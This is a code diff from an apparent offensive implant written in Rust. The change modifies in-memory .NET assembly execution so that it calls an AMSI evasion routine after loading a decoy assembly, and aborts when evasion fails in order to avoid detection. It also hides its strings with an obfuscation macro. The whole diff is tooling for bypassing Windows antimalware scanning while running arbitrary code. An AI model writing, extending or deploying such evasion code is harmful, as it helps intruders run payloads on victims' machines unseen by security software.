@@ -19,7 +19,7 @@ use windows_sys::{
 };
 
 use crate::{
-    evasion::patch_amsi_if_ft_flag,
+    evasion::amsi::evade_amsi,
     execute::ffi::{
         _AppDomain, _Assembly, ICLRMetaHost, ICLRRuntimeInfo, ICorRuntimeHost, IUnknown,
     },
@@ -37,6 +37,7 @@ pub enum DotnetError {
     SafeArrayAccessUnaccessFail(i32),
     BadEntrypoint(i32),
     Load3Failed(i32),
+    AmsiEvadeFail,
 }
 
 impl DotnetError {
@@ -91,6 +92,16 @@ impl DotnetError {
                 format!(
                     "{} {i:#X}",
                     sc!("Failed to load assembly into the process:", 73).unwrap()
+                )
+            }
+            DotnetError::AmsiEvadeFail => {
+                format!(
+                    "{}",
+                    sc!(
+                        "Failed to evade AMSI, not running dotnet code to protect you..",
+                        79
+                    )
+                    .unwrap()
                 )
             }
         }
@@ -190,7 +201,14 @@ fn execute_dotnet_assembly(buf: &[u8], args: &[String]) -> Result<String, Dotnet
     let _res = unsafe { load_3(app_domain as *mut _, p_decoy_sa, &mut sp_assembly) };
 
     // Now we can patch AMSI as it will have been loaded into the process by the above load_3
-    patch_amsi_if_ft_flag();
+    #[cfg(feature = "patch_amsi")]
+    {
+        if evade_amsi() == false {
+            // We somehow failed on evading AMSI and therefore we should avoid continuing as
+            // it could lead to a detection.
+            return Err(DotnetError::AmsiEvadeFail);
+        };
+    }
 
     // Reset assembly data and load the assembly with AMSI patched
     sp_assembly = null_mut();
